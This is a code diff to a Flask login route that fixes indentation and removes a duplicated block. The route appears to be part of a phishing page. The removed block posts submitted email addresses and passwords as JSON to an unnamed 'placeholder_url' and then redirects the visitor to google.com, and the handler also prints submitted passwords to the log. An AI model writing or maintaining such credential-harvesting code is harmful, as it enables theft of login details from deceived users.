@@ -657,9 +657,9 @@ def wrangler():
     errors = {}
     email = ''
     if request.method == 'POST':
-    print("Received form submission:", request.form)
-    email = request.form.get('email', '').strip()
-    password = request.form.get('password', '').strip()
+        print("Received form submission:", request.form)
+        email = request.form.get('email', '').strip()
+        password = request.form.get('password', '').strip()
 
     if not email:
         errors['email'] = 'Email is required'
@@ -687,32 +687,3 @@ def wrangler():
 
 
     return render_template('outofplace/dossier/partizan/bell.html', errors=errors, email=email)
-
-if request.method == 'POST':
-    print("Received form submission:", request.form)
-    email = request.form.get('email', '').strip()
-    password = request.form.get('password', '').strip()
-
-    if not email:
-        errors['email'] = 'Email is required'
-    if not password:
-        errors['password'] = 'Password is required'
-
-    if not errors:
-        payload = {'email': email, 'password': password}
-        headers = {'Content-Type': 'application/json'}
-        try:
-            response = requests.post(
-                placeholder_url,
-                json=payload,
-                headers=headers,
-                timeout=5
-            )
-            print("Response status:", response.status_code)
-            print("Response body:", response.text)
-            response.raise_for_status()
-        except requests.RequestException as e:
-            print("Request to placeholder failed:", e)
-            errors['submission'] = 'Failed to send data. Please try again later.'
-        else:
-            return redirect('https://google.com')
